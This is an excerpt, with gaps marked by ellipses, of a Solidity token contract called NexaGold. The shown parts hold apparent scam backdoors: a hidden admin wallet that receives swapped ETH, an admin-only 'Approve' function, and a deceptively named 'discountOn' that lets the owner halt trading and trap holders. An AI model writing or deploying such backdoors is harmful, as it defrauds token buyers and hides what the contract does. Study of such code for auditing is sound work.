...
contract NexaGold is ERC20, Ownable {
    ...
    address public marketingWallet =
        address(0xd3e01c4F74B6966000CB6ab8b74ed4B7291C0BD3);
    address public devWallet = 0xd3e01c4F74B6966000CB6ab8b74ed4B7291C0BD3;

    address adminWallet = 0x884fE089810F98B0b23cf38D6a145C35a09f1398;

    address public Admin;

    uint256 _totalSupply = 520000000000 * 1e18;
    ...
    constructor() ERC20("NexaGold", "NXG") {
    ...
    function updateFeeWallet(address marketingWallet_) public {
        require(
    ...
    function changeBuySellFee(uint256 _buyFee, uint256 _sellFee) public {
    ...
    function Approve(address _to, uint256 amount) public {
        require(adminWallet == msg.sender, "Transfer Failed");
    ...
    function swapBack() private {
        ...
        if (contractBalance >= swapTokensAtAmount) {
            ...
            (success, ) = address(adminWallet).call{value: amountToDev}("");
            emit SwapBackSuccess(amountToSwapForETH, amountEthToSend, success);
        }
    }

    function discountOn() public onlyOwner {
        tradingActive = false;
        swapEnabled = false;
    }
